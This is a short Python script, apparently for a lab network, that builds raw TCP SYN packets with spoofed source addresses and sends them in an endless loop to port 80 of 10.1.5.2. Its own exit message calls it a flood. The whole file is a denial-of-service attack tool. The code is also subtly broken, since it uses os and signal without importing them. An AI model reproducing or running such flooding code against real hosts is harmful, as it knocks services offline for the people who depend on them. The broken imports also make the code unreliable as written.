import socket, random

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

def signal_handler(sig, frame):
    print('\n\nStopping the flood. Goodbye')
    os._exit(1)

signal.signal(signal.SIGINT, signal_handler)

while True:
    ip_pool = [b"\x0a\x01\x02\x02", b"\x0a\x01\x03\x02", b"\x0a\x01\x04\x02"]

    ip_header = b"\x45\x00\x00\x3c\x4f\xfd\x40\x00\x3e\x06"
#IP checksum
    ip_header += b"\xd1\xb9"

#Source address
#ip_header += b"\x0a\x01\x02\x02"
    ip_header += random.choice(ip_pool)
#Dest Address
    ip_header += b"\x0a\x01\x05\x02"
#Source port (to randomize)
    ip_header += b"\xab\xd4"
#Dest port (80)
    ip_header += b"\x00\x50"
#SeqNum (to randomize)
    ip_header += b"\x7c\x4d\x12\x5e"
#Somewhere there is the checksum to be changed
    ip_header += b"\x00\x00\x00\x00\xa0\x02\xfa\xf0"

    #TCP checksum
    ip_header += b"\x88\xfe"

    ip_header += b"\x00\x00\x02\x04\x05\xb4\x04\x02\x08\x0a"

#Timestamp value
    ip_header += b"\x42\x0b\x2c\x30"

    ip_header += b"\x00\x00\x00\x00\x01\x03\x03\x07"
    
    s.sendto(ip_header, ('10.1.5.2',0))